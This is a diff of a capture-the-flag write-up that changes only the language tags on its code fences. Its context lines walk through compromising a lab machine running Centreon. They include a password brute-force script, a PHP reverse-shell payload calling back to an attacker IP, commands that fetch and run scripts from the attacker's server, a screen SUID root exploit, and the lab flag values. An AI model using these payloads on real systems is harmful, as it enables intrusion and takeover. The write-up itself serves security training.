@@ -10,7 +10,7 @@ Root access involved a vulnerable SUID binary.
 ## In the beginning..
 As usual, I run nMap:
 
-```
+```console
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -28,7 +28,7 @@ Finding http on port 80 along with SSH on port 22.
 
 Continuing with basic enumeration, I run dirb on the web app.
 
-```
+```console
 $ dirb http://10.10.10.157/
 ```
 Discovering these pages:
@@ -44,7 +44,7 @@ After attempting to login with common credentials and bruteforcing to no avail. 
 
 ## Verbs?
 Instead of GET, a POST request to /monitoring results in:
-```
+```console
 root@kali:~# curl -X POST "http://10.10.10.157/monitoring/" -d "username=u&password=p"
 <h1>This page is not ready yet !</h1>
 <h2>We should redirect you to the required page !</h2>
@@ -62,7 +62,7 @@ Looking around on centreon [documentation](https://documentation.centreon.com/do
 The documentation says the default username is admin.
 So I wrote a quick script to bruteforce login API using rockyou:
 
-```
+```bash
 #!/bin/bash
 cat rockyou.txt | while read line
 do
@@ -98,17 +98,17 @@ Instead of space, I used ${IFS} to escape the char as well as a PHP exploit to b
 Using the above links, I crafted a payload that results in status 200, then put the payload into Commands > Misc and bound it to the poller.
 
 Payload:
-```
+```php
 php${IFS}-r${IFS}'$s=fsockopen("10.10.14.***",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
 ```
 I then navigated to the page that mhaskar's script is sending requests to, checked the box that says 'post command' and hit export while listening on netcat.
 
 Netcat listener:
-```
+```console
 $ nc -lvp 1337
 ```
 I got a shell!
-```
+```console
 $ id
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
 ```
@@ -118,13 +118,13 @@ Now I have a restricted shell - I need to perfrom some privilege escalation.
 
 I used LinEnum by running the following on my machine in the directory that LinEnum was in.
 
-```
+```console
 $ python -m SimpleHTTPServer 8000
 ```
 
 And running the following on the target machine:
 
-```
+```console
 $ wget 10.10.14.***:8000/LinEnum.sh
 $ chmod +x LinEnum.sh
 $ ./LinEnum.sh
@@ -133,7 +133,7 @@ $ ./LinEnum.sh
 ## SUID PrivEsc
 
 Looking through the LinEnum report, I spot a vulnerable SUID:
-```
+```console
 -rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
 ```
 After a bit of research, I found an [exploit](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html)!
@@ -141,7 +141,7 @@ After a bit of research, I found an [exploit](https://lists.gnu.org/archive/html
 With accompanying script: [screen2root](https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh).
 
 In the same way as before I run the script on the target machine:
-```
+```console
 $ wget 10.10.14.***:8000/screenroot.sh
 $ chmod +x screenroot.sh
 $ ./screenroot.sh
@@ -151,24 +151,24 @@ $ ./screenroot.sh
 
 After running the script, I get root access!
 
-```
+```console
 $ whoami
 $ root
 ```
 
 I grab the root flag:
-```
+```console
 $ cat /root/root.txt
 $ 1fdbcf8c33eaa2599afdc52e1b4d5db7
 ```
 And the user flag:
-```
+```console
 $ cat /home/shelby/user.txt
 $ fe6194544f452f62dc905b12f8da8406
 ```
 
 ## Cleaning up after myself
-```
+```console
 $ cd /var/tmp
 $ rm screenroot.sh
 $ rm LinEnum.sh
